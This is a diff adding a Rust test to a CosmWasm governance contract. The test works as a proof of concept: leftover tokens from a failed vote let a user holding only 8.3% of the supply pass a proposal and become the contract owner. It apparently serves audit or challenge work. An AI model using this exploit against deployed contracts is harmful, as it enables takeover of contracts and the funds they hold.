@@ -235,4 +235,112 @@ pub mod tests {
             .unwrap();
         assert_eq!(config.owner, USER1.to_string());
     }
+
+    #[test]
+    fn gone_but_not_forgotten() {
+        // ADMIN has 100_000 tokens
+        // USER1 has 10_000 tokens
+        // USER2 has 10_000 tokens
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
+
+        // User1 propose themselves
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap();
+
+        // Admin votes, but not enough to pass the proposal
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(39_000)
+            },
+            &[],
+        )
+        .unwrap();
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+
+        // User1 ends proposal
+        let result = app
+            .execute_contract(
+                Addr::unchecked(USER1),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap();
+
+        assert_eq!(result.events[1].attributes[2], attr("result", "Failed"));
+
+        // ownership has not changed
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, "admin".to_string());
+
+
+        // Note that the contract -still- has 39_000 of the token supply (out of a total 120_000)
+        // So let's try creating another proposal
+
+        // USER2 creates a proposal which will make themselves the owner
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap();
+
+        // USER2 votes for the proposal, but only has 10_000 tokens to vote with 
+        // (out of 120_000 total tokens, so USER2 only has 8.3% of total supply)
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr,
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(10_000)
+            },
+            &[],
+        )
+        .unwrap();
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+
+        // USER2 ends proposal
+        let result = app
+            .execute_contract(
+                Addr::unchecked(USER2),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap();
+
+        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));
+
+        // Verify that USER2 is now the owner of the contract, despite only having 10_000 tokens (8.3%) to vote with
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, USER2.to_string());
+    }
+
 }
